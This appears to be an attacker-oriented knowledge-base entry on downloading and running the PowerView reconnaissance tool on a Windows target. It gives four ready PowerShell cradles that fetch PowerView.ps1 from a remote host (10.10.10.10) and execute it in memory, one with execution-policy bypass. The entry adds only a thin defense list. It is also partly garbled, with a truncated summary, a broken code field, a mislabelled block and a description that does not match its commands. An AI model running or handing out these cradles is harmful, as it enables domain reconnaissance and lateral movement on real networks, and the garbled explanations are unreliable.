---
id: 5c9fa534-cf6d-49bb-a2ea-91888409f9a6
name: PowerView Script Download and Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.061640+00:00'
updated_at: '2023-04-10T20:37:01.091335+00:00'
tags:
- '[[Load Powershell scripts]]'
- '[[Powershell]]'
commands:
- '[[Download and execute PowerView (Non-Proxy Aware)]]'
- '[[Download and execute PowerView (Proxy-Aware)]]'
---

# PowerView Script Download and Execution

## Summary

PowerView is a PowerShell tool used for gathering information and performing reconnaissance on Windows domains. It is often used by attackers to gain information about the target environment and move laterally within the network. PowerView can be used to download and execute PowerShell scripts, whi

## Description

# Description

PowerView is a PowerShell tool used for gathering information and performing reconnaissance on Windows domains. It is often used by attackers to gain information about the target environment and move laterally within the network. PowerView can be used to download and execute PowerShell scripts, which can be used to perform various tasks such as privilege escalation, credential theft, and data exfiltration. 

Technical Description: PowerView can be used to download and execute PowerShell scripts using the 'Invoke-WebRequest' and 'Invoke-Expression' cmdlets. The 'Invoke-WebRequest' cmdlet is used to download the script from a remote server, while the 'Invoke-Expression' cmdlet is used to execute the script on the target system. 

Business Value: This procedure can be used by attackers to gain sensitive information and move laterally within the network. By using PowerShell, attackers can evade traditional security measures and perform various malicious activities without being detected.

## Requirements

1. Access to PowerShell on the target system.

1. Remote access to the target system.

1. PowerView PowerShell tool.

## Defense

1. Monitor for suspicious PowerShell activity on the network.

1. Restrict PowerShell usage to trusted users and systems.

1. Implement application whitelisting to prevent unauthorized PowerShell scripts from running.

## Objectives

1. Download and execute PowerShell scripts on the target system.

1. Perform reconnaissance and gather information on the target environment.

1. Move laterally within the network.

# Instructions

1. This command downloads and executes the PowerView PowerShell script from a remote server. It includes two different methods, one for proxy-aware systems and one for non-proxy aware systems.

**Code**: [[# Download and execute PowerView

# Proxy-aware
IE]]

> The first method uses the IEX (Invoke-Expression) cmdlet to download and execute the script. It first downloads the script using the WebClient object and then executes it using PowerShell. It also includes a command to output the script to the console.

The second method is for systems that are not proxy-aware and uses the WinHttpRequest COM object to download the script and then executes it using PowerShell. The $false parameter is used to indicate that the request should not use a proxy server.

**Command** ([[Download and execute PowerView (Proxy-Aware)]]):

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"
```

**Command** ([[Download and execute PowerView (Non-Proxy Aware)]]):

```bash
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

## Commands Used

- [[Download and execute PowerView (Non-Proxy Aware)]]
- [[Download and execute PowerView (Proxy-Aware)]]

## Tags

- [[Load Powershell scripts]]
- [[Powershell]]
